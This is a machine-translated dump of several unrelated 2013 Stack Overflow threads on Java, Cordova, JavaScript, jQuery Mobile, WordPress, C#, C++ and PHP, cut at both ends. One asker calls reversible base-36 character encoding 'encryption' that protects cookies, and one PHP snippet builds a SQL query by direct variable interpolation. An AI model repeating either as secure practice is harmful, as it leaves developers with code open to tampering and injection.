不确定这是否正是您正在寻找的，但请尝试给这个网站一个机会：http:
[//yihui.name/knitr/demo/reference/](http://yihui.name/knitr/demo/reference/)

不要对第一句话谈论 Sweave 块感到恼火，它完全专注于 knitr 块。

干杯...

# java - 数组与其他类 - 对象 - Java

> ID：14346818
> 
> 赞同：0
> 
> 时间：2013-01-15T20:59:22.477
> 
> 标签：java, arrays, class

我有 3 个课程`Course`：`CourseEntry`和`Transcript`。在成绩单中，我有一个添加课程的功能，比如：

```
public class Transcript {
    CourseEntry coursestaken[] = new CourseEntry[6];

    public void addCourse(Course course)
    {
        coursestaken[lastIndexOf(getCoursestaken())] = new CourseEntry(course);
    }
    (lastIndexOf gives me the empty array index - it's working on) 
```

在我的`CourseEntry`：

```
public class CourseEntry {
    Course course;
    char grade = 'I';

    public CourseEntry(Course course)
    {
        this.course = course;
    } 
```

在我的`Course`：

```
public  class Course {
    int courseNumber,credits;
    String courseName;

    public Course addNewCourse(int courseNumber, int credits, String courseName)
    {
        this.courseNumber = courseNumber;
        this.credits = credits;
        this.courseName = courseName;

        return this;
    } 
```

在我的主要：

```
Transcript t = new Transcript();
Course course = new Course();

Course matematik = course.addNewCourse(1, 2, "Matematik");
t.addCourse(matematik);

Course turkce = course.addNewCourse(1, 4, "Türkçe");
t.addCourse(turkce); 
```

但是如果我循环 coursetaken 数组，它会打印最后插入的所有索引。

我该如何解决？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T21:04:30.050

您需要`Course`为每门课程创建一个新对象，您的`addNewCourse`方法只会改变当前`Course`对象。`Course`像这样修改：

```
public class Course {
    private final int courseNumber;
    private final int credits;
    private final String courseName;

    public Course(int courseNumber, int credits, String courseName) {
        this.courseNumber = courseNumber;
        this.credits = credits;
        this.courseName = courseName;
    }

    public int getCourseNumber() {
        return courseNumber;
    }

    public int getCredits() {
        return credits;
    }

    public String getCourseName() {
        return courseName;
    }
} 
```

然后使用以下内容：

```
Transcript t = new Transcript();

Course matematik = new Course(1, 2, "Matematik");
t.addCourse(matematik);

Course turkce = new Course(1, 4, "Türkçe");
t.addCourse(turkce); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T21:12:35.413

对象是Java中的**引用**，即指向对象的指针。所以当你这样做时：

```
Object a = new Object();
Object b = a; 
```

您不是将整个对象复制`a`到`b`，而是将**引用`a`**复制到`b`（内存地址）。所以`a`和`b`都是对创建的对象的引用`new`。

让我们按照您的代码来看看发生了什么：

```
Course course = new Course();
Course matematik = course.addNewCourse(1, 2, "Matematik");
    this.courseNumber = courseNumber;
    this.credits = credits;
    this.courseName = courseName;
    return this; 
```

在这里你修改了`course`对象。`matematik`now 也一样，`course`因为它指向同一个对象。

```
Course turkce = course.addNewCourse(1, 4, "Türkçe"); 
```

在这里你`course`再次修改。现在`course`和`turkce`都`matematik`引用同一个对象，您首先使用`Course course = new Course();`.

我认为解决这个问题的最简单方法是创建一个带参数的构造函数：

```
public class Course {
...
     public Course(int courseNumber,int credits,String courseName) {
           this.courseNumber = courseNumber;
           this.credits = credits;
           this.courseName = courseName;
     }
} 
```

接着

```
 Course matematik = new Course(1, 2, "Matematik");
  t.addCourse(matematik);

  Course turkce = new Course(1, 4, "Türkçe");
  t.addCourse(turkce); 
```

# file - 捆绑和访问 BlackBerry PhoneGap / Cordova 文件系统中的文件

> ID：14346822
> 
> 赞同：0
> 
> 时间：2013-01-15T20:59:31.773
> 
> 标签：file, sqlite, cordova, blackberry

我正在使用 Cordova / PhoneGap 构建一个 BlackBerry 应用程序。我的最终目标是能够将预填充的 SQLite 数据库与应用程序捆绑在一起。

我看过一些教程建议在 Assets 文件夹中包含所需的文件并在第一次加载应用程序时加载它。

为了实现预填充数据库的结束，我将要访问黑莓设备上的本地文件系统。

使用 Cordova 文档中提供的示例，我汇总了以下内容：

```
onDeviceReady: function() {
    app.receivedEvent('deviceready');
    var fail = function(err){console.log(err)};
    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, 
        function(fs){
            var reader = fs.root.createReader().readEntries(
                function(entries){
                    console.log("FS:"+entries)
                },
                fail);
        },fail
    );
    window.resolveLocalFileSystemURI("file:///store/home", 
        function(uri){
            console.log(uri);
        }, 
        fail);      
} 
```

在所有情况下，模拟器上的文件列表都是空的（专门尝试使用 chromeipple 插件）

```
missing exec:File.resolveLocalFileSystemURI ripple.js:39
["file:///store/home"] ripple.js:39
TypeError
 ripple.js:39
TypeError: Cannot read property 'root' of undefined
    at Object.module.exports.resolveLocalFileSystemURI (chrome-    extension://geelfhphabnejjhdalkjhgipohgpdnoc/ripple.js:39:7398)
    at module.exports.exec (chrome-    extension://geelfhphabnejjhdalkjhgipohgpdnoc/ripple.js:39:19386)
    at module.exports (http://telusbb.com/cordova-2.3.0.js:9602:5)
    at app.onDeviceReady (http://telusbb.com/js/index.js:73:10)
    at Channel.fire (http://telusbb.com/cordova-2.3.0.js:690:23)
    at http://telusbb.com/cordova-2.3.0.js:219:47 ripple.js:39
File ripple.js:46
    resolveLocalFileSystemURI 
 FS: 
```

我无法从文档中找出我想在哪里存储一个文件以使其出现在 PhoneGap 文件系统中。

目前我的资产文件夹`<sampleapplciation>/www/assets`在如果我想在应用程序中访问它们，我应该存储文件的另一个路径吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-04T17:26:42.777

我认为您最好的选择是在包之外构建您的预打包 SQLite DB，然后使用 INSERT 查询，在应用程序首次启动时构建 DB。

我正在我的一个 iOS Phonegap 应用程序中执行此操作（当然，使用非常简单的数据库）。它完美地工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-09T11:07:26.503

可能无关紧要，但我相信 Ripple 问题与您计算机上文件的位置有关。顺便说一句，我建议你使用 WebWorks SDK，它非常棒，有很多原生 API 访问，也许 IO api 可以帮助你满足你的需要，而且使用 Ripple 或命令行打包和安装非常简单（调试该设备在支持 Web 检查器的设备上也非常出色）。

# javascript - 有没有办法将字符串转换为以 10 为底的数字进行加密？

> ID：14346829
> 
> 赞同：6
> 
> 时间：2013-01-15T21:00:06.173
> 
> 标签：javascript

注意：我发现了一个[类似的问题](https://stackoverflow.com/questions/10716796/how-to-convert-a-string-to-its-base-10-representation)，但它是在 python 中。

* * *

我一直在尝试为此考虑一种算法或本机方法，但我很难过。

这是我到目前为止所拥有的：

```
encode=function(n,f){
    return (n).toString(f)
}
decode=function(s,f){
    return parseInt(s,f)
} 
```

基本上，我需要一种将字符串转换`'Hello World!'`为基数 10（十六进制也可以）数字的方法，例如`14438792758793754875`，我想知道是否有适当的方法可以在我浪费时间之前这样做：

```
str='Hello World'
returnString=''
for(var i in str){
    returnString+=(
        str[i]=='A'?'0'
        :str[i]=='B'?'1'
        etc...
    )
} 
```

这不仅会非常耗时，而且我不知道如何将其转换回来，因为一旦我输入像`11`for这样的数字`L`，for 循环就不会这样做，而是会返回`BB`。

我问这个的原因是因为我计划在未来使用它来实现更高效、更安全的加密存储。例如，类似：

```
//save
numstr=encodeToNumber(inputElement.value)
b36str=encode(numstr,36)
storage['items'].push(b36str)
localStorage['App Data']=JSON.stringify(storage)

//load
if(localStorage['App Data']){
    storage=JSON.parse(localStorage['App Data'])
}else{
    storage={
        items:[],
        config:{
            etc
        }
    }
}
//Assuming storage.items looks like this: ['rgie', 'zyy', '2il7']
for(i in storage['items']){
    b36str=storage['items']//rgie, zyy, 2il7
    numstr=decode(b36str,36)//1281110, 46618, 117403
    container.innerHTML+='<hr>'+decodeFromNumber(numstr)//Milk, Eggs, Bread
}

//Output
Milk
Eggs
Bread 
```

实际上，我确实花了几分钟时间手动将“牛奶”、“鸡蛋”和“面包”加密到它们的 base36 对应物，这样它就可以准确了。

* * *

更新：`Aadit M Shaw`给出了一个从字符串生成十六进制字符串的函数，我根据我的需要对其进行了逆向工程，得到了这个：

```
en=function(s){
    var s2d=function(s){
        s=s.replace(/ /g,'+').replace(/!/g,'.')
        var n=[]
        for(var i in s){
            n.push(s.charCodeAt(i))
        }
        return n
    }
    var arr=s2d(s)
    var s2=''
    for (var i in arr){
        s2+=arr[i].toString(36)
    }
    return s2
}
de=function(s){
    var arr=s.split(/(..)/)
    var arr2=[]
    var s2=''
    for(var i in arr){
        if(arr[i]){
            arr2.push(parseInt(arr[i],36))
        }
    }
    for(var i in arr2){
        s2+=String.fromCharCode(arr2[i])
    }
    return s2.replace(/\+/g,' ')
} 
```

虽然编码的字符串比我想要的要大，但它对于保护 cookie 不被黑客攻击或其他东西可能很有用。

例如，使用我在[这里](http://jsfiddle.net/meA7f/)制作的示例，我制作了这个消息`21173b2x3030172t2p38173d333936172u2p2r2t`以及这个`ЎǄ̺ǦǄ̌`。如果你设法解码第二个，那么也解码这个`ʒ̴ͻϮ`

不过，这不是很实用，所以我最终可能会使用`Ragnarokkr`链接到的库。

谢谢大家的回复！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-15T21:10:58.720

尝试这个：

```
function encode(string) {
    var number = "0x";
    var length = string.length;
    for (var i = 0; i < length; i++)
        number += string.charCodeAt(i).toString(16);
    return number;
} 
```

在此处查看演示：http: [//jsfiddle.net/hGKAg/2/](http://jsfiddle.net/hGKAg/2/)

解码同样简单：

```
function decode(number) {
    var string = "";
    number = number.slice(2);
    var length = number.length;
    for (var i = 0; i < length;) {
        var code = number.slice(i, i += 2);
        string += String.fromCharCode(parseInt(code, 16));
    }
    return string;
} 
```

尝试演示：http: [//jsfiddle.net/hGKAg/3/](http://jsfiddle.net/hGKAg/3/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T21:12:42.973

虽然我以前从未使用过它，但我的一个朋友给了这个库一个很好的评价。显然，您可以使用此库的任何基本标准对字符串进行编码：

[Nibbler.js](http://www.tumuski.com/2010/04/nibbler/)

# jquery - HTML/JQuery Mobile 删除数字输入字段上的上下点击器

> ID：14346831
> 
> 赞同：0
> 
> 时间：2013-01-15T21:00:09.213
> 
> 标签：jquery, html

我目前有以下用于输入数字的移动应用程序的代码：

```
<label for="number"> How much is your bill?</label>
<input type="number" step="0.01" min="0" placeholder="Enter a Value" required="true" />
<input type="submit" value = "Submit">
<input type="reset" value = "Clear"> 
```

它应该看起来像这样：

[http://oi49.tinypic.com/33zg2zp.jpg](http://oi49.tinypic.com/33zg2zp.jpg)

我想知道是否可以删除数字输入字段一侧的上下切换。请告诉我。谢谢！

编辑：哎呀，我修复了链接。图片现在应该可以工作了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:26:31.437

这就像要求从 SELECT 中删除向下箭头。

您可以尝试掩盖它，但您无法更改该类型控件的本机行为。

# php - functions.php 被随机修改？

> ID：14346833
> 
> 赞同：0
> 
> 时间：2013-01-15T21:00:15.830
> 
> 标签：php, wordpress

我的 functions.php 文件有一个奇怪的问题，每 30 分钟左右，文件中间会丢失大约 10 行，这会导致此错误：

> 解析错误：语法错误，第 192 行 /home/thebueno/public_html/wp-includes/functions.php 中的意外 '$mm' (T_VARIABLE)

即使在我恢复文件之后，该文件也会以完全相同的方式进行修改。

我想请问专家您是否会看一下特定的罪魁祸首？在这种情况下，你的直觉告诉你什么？几个月来，此服务器上没有任何更改。突然，一个文件以最奇怪的方式被修改：没有被截断，而是从第 192 行开始取出了 10 行。

什么会自动修改内部 WordPress 文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:22:10.697

这是一个正在发生的黑客行为；在 wordpress.org 论坛中有许多用户从中恢复的实例。

目前没有已知的 WP 漏洞，但您的共享主机或 VPS 正在被利用。黑客正试图在 WP 的 functions.php 文件中添加一个 php 函数，以提供恶意软件或垃圾邮件链接。

您需要彻底清除黑客并更改访问权限，否则您将再次被黑客入侵。使用这些资源并按照所有说明彻底清理您的网站，否则您可能会再次被黑客入侵。请参阅[常见问题解答：我的网站被黑了 « WordPress Codex](http://codex.wordpress.org/FAQ_My_site_was_hacked)和[如何彻底清理您被黑的 wordpress 安装](http://smackdown.blogsblogsblogs.com/2008/06/24/how-to-completely-clean-your-hacked-wordpress-installation/)和[如何在被黑的 WordPress 中找到后门](http://ottopress.com/2009/hacked-wordpress-backdoors/)和[强化 WordPress « WordPress Codex。](http://codex.wordpress.org/Hardening_WordPress)

更改所有密码。扫描您自己的 PC。前后使用[http://sitecheck.sucuri.net/ 。](http://sitecheck.sucuri.net/)

告诉你的网络主机你被黑了；并考虑更改为更安全的主机：[推荐的 WordPress 虚拟主机](http://wordpress.org/hosting/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:03:01.393

最可能的答案是您的 WordPress 安装已被黑客入侵。大多数 WordPress 黑客似乎都修改了 functions.php。

我建议下载一个新副本，删除您的安装，然后安装您的新副本。

# javascript - 光滑网格总数

> ID：14346835
> 
> 赞同：2
> 
> 时间：2013-01-15T21:00:22.477
> 
> 标签：javascript, slickgrid

在 slickgrid 中，我放了一个总聚合器总和。它总结了该列中的所有行（百分比）并且工作正常。但现在我面临着我只想从活跃百分比中获取总数。活动列是包含 0 或 1 的其他列。

在列定义中：

```
{id: "percent", name: "Percent", field: "percent", minWidth: 60, sortable: true, groupTotalsFormatter: sumTotalsFormatter, editor: Slick.Editors.Text}

function sumTotalsFormatter(totals, columnDef, id) 
{
  return "Total: " + Math.round(totals.sum[columnDef.field]) + "%";
} 
```

聚合器：

```
 dataView.setAggregators([
    new Slick.Data.Aggregators.Avg("percent"),
    new Slick.Data.Aggregators.Sum("percent")
  ], false); 
```

我一直在尝试不同的方法但没有成功（放置一个不显示的第二个字段来仅存储活动数据，搜索如何修改聚合器..等）。任何的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-07T22:13:01.000

（在问题编辑中回答。转换为社区 wiki 答案。请参阅[将问题的答案添加到问题本身时的适当操作是什么？](https://meta.stackoverflow.com/questions/267434/what-is-the-appropriate-action-when-the-answer-to-a-question-is-added-to-the-que)）

OP写道：

> 好吧，我解决了在 Firebug 中爬行并重新测试了几次。这是我的解决方案：
> 
> ```
> function sumTotalsFormatter(totals, columnDef) 
> {
>   var suma      = 0;
>   //current group...
>   var groupo    = totals.group.value;
>   for (var i=0; i<data.length; i++)
>   {
>     if(data[i].active == '1')
>     {
> //data[i].us is the one who makes the groups...
>         if(groupo == 1 && data[i].us == '1')
>         {
>             suma += parseInt(data[i].percent);
>         }
>         else if(groupo == 0 && data[i].us == '0')
>         {
>             suma += parseInt(data[i].percent);
>         }
>     }   
>   }
>   return "Total: " + suma + "%"; 
> } 
> ```

# gwt - 当我更改端点时，GWT RPC 调用不起作用

> ID：14346844
> 
> 赞同：0
> 
> 时间：2013-01-15T21:01:06.280
> 
> 标签：gwt, rpc

我有一个简单的 RPC 调用，它在调用本地服务器时工作正常

```
 ContactsServiceAsync rpcService = GWT.create(ContactsService.class);

      rpcService.getContactDetails(new AsyncCallback<ArrayList<ContactDetails>>() {
      public void onSuccess(ArrayList<ContactDetails> result) {
          Window.alert("Successfully called server");
      }

      public void onFailure(Throwable caught) {
        Window.alert("Error calling server");
      }
    }); 
```

我现在要做的是更改端点以在 GAE 上调用服务（我刚刚在 GAE 上部署了相同的 GWT 应用程序，因此服务名称应保持不变）

```
 ContactsServiceAsync rpcService = GWT.create(ContactsService.class);

  ServiceDefTarget target = (ServiceDefTarget) rpcService;
  target.setServiceEntryPoint("http://myquizapp2.appspot.com/");

  rpcService.getContactDetails(new AsyncCallback<ArrayList<ContactDetails>>() {
      public void onSuccess(ArrayList<ContactDetails> result) {
          Window.alert("Successfully called server");
      }

      public void onFailure(Throwable caught) {
        Window.alert("Error calling server");
      }
    }); 
```

请注意我为更改客户端将用于调用服务的端点所做的“尝试”。它不起作用，我的 onFailure 方法被调用。我是在尝试做一些没有任何意义的事情，还是完全可以做到？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T04:01:09.567

你应该看看如何实现跨域 GWT RPC。您可以从这里的一些示例开始[http://java.dzone.com/articles/how-do-cross-domain-gwt-rpc](http://java.dzone.com/articles/how-do-cross-domain-gwt-rpc)

# jquery-mobile - JQueryMobile Popup 样式不正确

> ID：14346845
> 
> 赞同：2
> 
> 时间：2013-01-15T21:01:10.180
> 
> 标签：jquery-mobile

我正在尝试使用 jQuery Mobile 显示弹出窗口，但弹出窗口的样式有问题。HTML 标记如下所示：

```
<div data-role="popup" id="confirmDialog" data-overlay-theme="a" data-theme="c" style="max-width:400px;" class="ui-corner-all">
        <div data-role="header" data-theme="a" class="ui-corner-top">
            <h1>Delete Page?</h1>
        </div>
        <div data-role="content" data-theme="d" class="ui-corner-bottom ui-content">
            <h3 class="ui-title">Are you sure you want to delete this page?</h3>
            <p>This action cannot be undone.</p>
            <a href="#" data-role="button" data-inline="true" data-rel="back" data-theme="c">Cancel</a>    
            <a href="#" data-role="button" data-inline="true" data-rel="back" data-transition="flow" data-theme="b">Delete</a>  
        </div>
    </div> 
```

（顺便说一句，此代码是从 jQuery Mobile 站点复制的）。

当我使用 .popup('open') 方法打开弹出窗口时，标题（删除页面？）和按钮没有样式。标题显示为常规文本，按钮显示为常规链接。

什么会导致这种行为？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:07:27.237

您的 HTML 可能有错误。

这是您的代码中的一个工作示例：http: [//jsfiddle.net/Gajotres/EtDZc/](http://jsfiddle.net/Gajotres/EtDZc/)

```
<!DOCTYPE html>
<html>
<head>
    <title>jQM Complex Demo</title>
  <meta name="viewport" content="width=device-width"/>
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.css" />
    <script src="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.js"></script>    
</head>
<body>
    <div data-role="page" id="index">
        <div data-theme="a" data-role="header">
            <h3>
                First Page
            </h3>
            <a href="#second" class="ui-btn-right">Next</a>
        </div>

        <div data-role="content">
            <a href="#" data-role="button" id="test-button">Test popup</a>
            <div data-role="popup" id="confirmDialog" data-overlay-theme="a" data-theme="c" style="max-width:400px;" class="ui-corner-all">
                <div data-role="header" data-theme="a" class="ui-corner-top">
                  <h1>Delete Page?</h1>
                </div>
                <div data-role="content" data-theme="d" class="ui-corner-bottom ui-content">
                  <h3 class="ui-title">Are you sure you want to delete this page?</h3>
                  <p>This action cannot be undone.</p>
                  <a href="#" data-role="button" data-inline="true" data-rel="back" data-theme="c">Cancel</a>    
                  <a href="#" data-role="button" data-inline="true" data-rel="back" data-transition="flow" data-theme="b">Delete</a>  
                </div>
            </div>
        </div>

        <div data-theme="a" data-role="footer" data-position="fixed">

        </div>
    </div>   
</body>
</html> 
```

和这个：

```
$('#index').live('pagebeforeshow',function(e,data){    
    $('#test-button').live('click', function(e) {
        $('#confirmDialog').popup('open');
    });    
}); 
```

使用 jQuery 1.9 或更高版本时，您必须使用 function on，live 已弃用且不再存在。

```
$(document).on('pagebeforeshow','#index',function(e,data){    
    $(document).on('click', '#test-button',function(e) {
        $('#confirmDialog').popup('open');
    });    
}); 
```

您也可能正在使用准备好用于事件绑定的文档。它不应该与 jQuery Mobile 一起使用，而是使用**[页面事件](http://www.gajotres.net/document-onpageinit-vs-document-ready/)**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-18T19:25:37.113

我认为您的问题是在标题之前定义弹出窗口 ID。您可以在正文部分和内容之前定义它。然后在内容部分，您可以定义调用按钮并将其设置为弹出调用。

# c# - 如何使用全局热键从任何 Windows 应用程序中成功复制突出显示的文本？

> ID：14346847
> 
> 赞同：0
> 
> 时间：2013-01-15T21:01:24.503
> 
> 标签：c#, winapi, pinvoke

我正在使用[RegisterHotKey](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646309%28v=vs.85%29.aspx)来定义一个系统范围的热键，当按下该热键时，它将自动将任何突出显示的文本复制到 Microsoft Windows 中的剪贴板。

只需按`Ctrl`+即可将文本复制到剪贴板，`C`因为这似乎是我能找到的几乎所有 Windows 应用程序中唯一可用的东西之一。[通过调用keybd_event](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646304%28v=vs.85%29.aspx)来按下键本身。

全局热键和复制到剪贴板实际上在任何情况下都非常有效，除非我将热键指定为包含`Ctrl`. 这`Ctrl`似乎干扰了复制到剪贴板或类似的东西。

*示例*：如果我将热键设置为`F11`，一切都会正确启动并复制文本。而`Ctrl`++`Alt`将`D`简单地拒绝复制突出显示的文本。

我试着玩弄 BlockInput 看看这是否会阻止任何其他事情对我的击键产生影响。

我还尝试将 KEYEVENTF_KEYUP 发送到`Ctrl`, `Alt`，`Shift`希望它将我的所有键设置为 KeyUp 状态。下面是一个例子：

```
// This will send ctrl + C to the active window to copy something to the clipboard.
public static void SendCtrlC(IntPtr hWnd)
{
    const byte Control = (byte)VKCode.Control;
    const byte LeftControl = (byte)VKCode.Lcontrol;
    const byte LeftAlt = (byte)VKCode.Lmenu;
    const byte LeftShift = (byte)VKCode.Lshift;
    const byte RightControl = (byte)VKCode.Rcontrol;
    const byte RightAlt = (byte)VKCode.Rmenu;
    const byte RightShift = (byte)VKCode.Rshift;
    const byte KeyC = (byte)VKCode.KeyC;
    const int KeyUp = (int)KeyEvent.KeyEventFKeyUp;
    const int KeyDown = (int)KeyEvent.KeyEventFKeyDown;

    KeyBdEvent(LeftControl, 0, KeyUp, 0); // Left Control Up
    KeyBdEvent(LeftAlt, 0, KeyUp, 0); // Left Alt Up
    KeyBdEvent(LeftShift, 0, KeyUp, 0); // Left Shift Up

    KeyBdEvent(RightControl, 0, KeyUp, 0); // Left Control Up
    KeyBdEvent(RightAlt, 0, KeyUp, 0); // Left Alt Up
    KeyBdEvent(RightShift, 0, KeyUp, 0); // Left Shift Up

    Window.SetForegroundWindow(hWnd);

    KeyBdEvent(Control, 0, KeyDown, 0); // Left Control Down
    KeyBdEvent(KeyC, 0, KeyDown, 0); // Key C Down
    KeyBdEvent(KeyC, 0, KeyUp, 0); // Key C Up
    KeyBdEvent(Control, 0, KeyUp, 0); // Left Control Up
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:10:05.457

检查： [http://pinvoke.net/default.aspx/user32.sendinput](http://pinvoke.net/default.aspx/user32.sendinput) , [SendInput @ msdn](http://msdn.microsoft.com/en-us/library/windows/desktop/ms646310%28v=vs.85%29.aspx) 您还可以使用 SendInput 添加双击以自动获取突出显示的文本。请记住，您不应操纵剪贴板将信息发送到应用程序。

# c++ - 如何从多图中冗余项目

> ID：14346848
> 
> 赞同：0
> 
> 时间：2013-01-15T21:01:29.870
> 
> 标签：c++, set, multimap, redundancy

我有一些如下文件，我需要删除多图

```
 3KHJG 76  238
 3KHJG 86  238
 3GDMB 31  244
 3GDMB 31  247
 3GDMB 31  251
 3KOFA 21  336
 3KOFA 36  263 
```

……

我需要得到一个文件，例如：

```
 3KHJG 81  238
 3GDMB 31  247 
```

......

// 保留字符串键并计算下一列的平均值；

我有

```
 typedef struct S{
   int v1;
   int v2;
   ...
   }struct1;

struct1 s1;                 
//I parsed the old file and put them into a multimap and a set<string>;
multimap <string, s1> m;
multimap <string, s1>::iterator i;
set <string> pa_set;
int sumv1, sumv2;
int avgv1, avgv2;
for (set<string>:: iterator ip= pa_set.begin(); ip !=pa_set.end(); ip++)
{

  multimap <string, struct1> ::iterator i = m.find(*ip);

       int cnt=m.cout(*ip);
       if (ip != m.end())
      { 
        v1 =i->second.v1;
        v2 =i->second.v2;
        sumv1+=v1;
        sumv2+=v2;
        i++;
      }

      //calculate the avgv1 and avgv2;
} 
```

但是，如果我使用 if (){} 看起来我只迭代一次？我怎样才能通过所有的interators fullfill

```
 multimap<string,struct1> ::iterator i = m. find(*ip) && i != m.end() ; 
```

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:14:40.573

您可以使用该[`equal_range`](http://www.cplusplus.com/reference/map/multimap/equal_range/)函数为您提供一对迭代器到您将计算平均值的范围。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:15:36.577

您需要为此使用`equal_range`，例如：

```
equal_range(*ip); 
```

在此处查看[此示例](http://www.cplusplus.com/reference/map/multimap/equal_range/)。

# php - php datetime/datetimezone 减去 2 小时而不是 1

> ID：14346851
> 
> 赞同：0
> 
> 时间：2013-01-15T21:01:34.863
> 
> 标签：php, datetime, timezone

您好，我有一个像欧洲/柏林这样的特殊时区，我想在当前日期上增加 90 天。之后我检测到一个月的最后一天。

我在数据库中的日期以 UTC 保存。这就是为什么我必须在最后更改时区。

我的问题是，时区更改从欧​​洲/柏林和 UTC 之间的时间中减去 2 小时。当我在将日期时间对象更改为 UTC 之前不修改它时，它只会减去 1 小时。谁能告诉我问题是什么或正确的解决方案？

```
//$timezone = 'Europe/Berlin';
private function getMaxTillDate($timezone)
{        
    $threemonth = new \DateTime('now', new \DateTimeZone($timezone) );
    $threemonth->setTime(23, 59, 59);
    $threemonth->add(new \DateInterval('P0Y90DT0H0M'));
    $maxday = $threemonth->format('t');        
    $threemonth->setDate($threemonth->format('Y'), $threemonth->format('m'), $maxday);
    $threemonth->setTimezone(new \DateTimeZone('UTC'));

    return $threemonth;
} 
```

非常感谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:32:17.397

我测试了你的代码 - 它对我有用：

```
function getMaxTillDate($timezone){
    $threemonth = new \DateTime('now', new \DateTimeZone($timezone) );
    var_dump(1, $threemonth);
    $threemonth->setTime(23, 59, 59);
    var_dump(2, $threemonth);
    $threemonth->add(new \DateInterval('P0Y90DT0H0M'));
    var_dump(3, $threemonth);
    $maxday = $threemonth->format('t');
    var_dump(4, $threemonth, $maxday);
    $threemonth->setDate($threemonth->format('Y'), $threemonth->format('m'), $maxday);
    var_dump(5, $threemonth);
    $threemonth->setTimezone(new \DateTimeZone('UTC'));
    var_dump(6, $threemonth);
    return $threemonth;
}

$tz = "Europe/Berlin";

var_dump(getMaxTillDate($tz)); 
```

结果：

```
int(1)
class DateTime#1 (3) {
public $date =>
string(19) "2013-01-15 22:29:59"
public $timezone_type =>
int(3)
public $timezone =>
string(13) "Europe/Berlin"
}
int(2)
class DateTime#1 (3) {
public $date =>
string(19) "2013-01-15 23:59:59"
public $timezone_type =>
int(3)
public $timezone =>
string(13) "Europe/Berlin"
}
int(3)
class DateTime#1 (3) {
public $date =>
string(19) "2013-04-15 23:59:59"
public $timezone_type =>
int(3)
public $timezone =>
string(13) "Europe/Berlin"
}
int(4)
class DateTime#1 (3) {
public $date =>
string(19) "2013-04-15 23:59:59"
public $timezone_type =>
int(3)
public $timezone =>
string(13) "Europe/Berlin"
}
string(2) "30"
int(5)
class DateTime#1 (3) {
public $date =>
string(19) "2013-04-30 23:59:59"
public $timezone_type =>
int(3)
public $timezone =>
string(13) "Europe/Berlin"
}
int(6)
class DateTime#1 (3) {
public $date =>
string(19) "2013-04-30 21:59:59"
public $timezone_type =>
int(3)
public $timezone =>
string(3) "UTC"
}
class DateTime#1 (3) {
public $date =>
string(19) "2013-04-30 21:59:59"
public $timezone_type =>
int(3)
public $timezone =>
string(3) "UTC"
} 
```

# php - 无法弄清楚如何从我的对象中回显一个简单的字符串

> ID：14346853
> 
> 赞同：0
> 
> 时间：2013-01-15T21:01:45.113
> 
> 标签：php, class, object, soap

我是对象和类的新手，但我正在尝试为我的一个简单的肥皂请求创建一个类，这样我就可以只使用作业编号来调用作业的状态。即使我可以确认它正在工作，我也不知道如何使用状态结果。

这是我班上的内容

```
public function validatejob() {
        $client = new SoapClient('http://server/Service.asmx?wsdl');
        $user = array("Username" => "", "Password" => "");
        $jobnumber = $this->jobnumber;
        $response1 = $client->GetSummaryJobStatus(
          array(
            "Credentials" => $user,
            "JobNumber" => $jobnumber,
            ));
        //$response1 -> GetSummaryJobStatusResult;
        echo $response1 -> GetSummaryJobStatusResult;
} 
```

这是我页面上的内容：

```
$soap = new Soap; //create a new instance of the Users class
$soap->storeFormValues( $_POST ); 
$soap->validatejob();
print_r($soap->$response1->GetSummaryJobStatusResult); 
```

这将打印在页面上：

```
HISTORY Fatal error: Cannot access empty property in /home/shawmutw/public_html/client/support.php on line 10 
```

您可以看到它失败了，但 HISTORY 是我正在寻找的结果。如何正确回显 HISTORY 部分或将其存储在要使用的变量中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:05:06.530

您必须定义一个类属性并将响应分配给它，如下所示：

```
class A {
    public $response1;

    public function validateJob() {
        ...
        $this->response1 = $client->GetSummaryJobStatus(
        ...
    }   
} 
```

然后您可以通过您的实例访问您的类属性，如下所示：

```
print_r($soap->response1->GetSummaryJobStatusResult); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:36:39.597

您的方法“validateJob”不返回任何内容，也不将结果存储在任何属性中，因此无法在此方法之外访问它。

```
return $response1; // will help inside the method

$job = $soap->validateJob(); // save result

var_dump($job); // see what you get. 
```

# php - Json：将数组/变量传递给外部 js 文件

> ID：14346854
> 
> 赞同：1
> 
> 时间：2013-01-15T21:01:45.703
> 
> 标签：php, javascript, json

我有一个使用外部 js 文件的 php webform

外部文件运行事件，例如：onload、onchange 和 onSubmit

在我的 php 应用程序中，我使用以下方法从 db 收集数据：

```
<?php
$reqFlds  = array();
$results = mysql_query("select id, display_name from field where account_id = $acct_id2 and required_flag = 1");
    while($RequireResult = mysql_fetch_assoc($results))
        {
            $reqFlds[] = $RequireResult;
        }
    foreach($reqFlds as &$reqFld)
        {
            $reqFld = "'".$reqFld["id"] . "||" . $reqFld["display_name"]."'";
        }
?> 
```

**然后我使用 json 收集数据并将其转储到 php 应用程序中的变量 js 脚本中**

```
<script language="javascript">
    var holdReqFlds = <?php echo json_encode($reqFlds); ?>;
</script> 
```

**var/array 结果显示如下 View from page source**

```
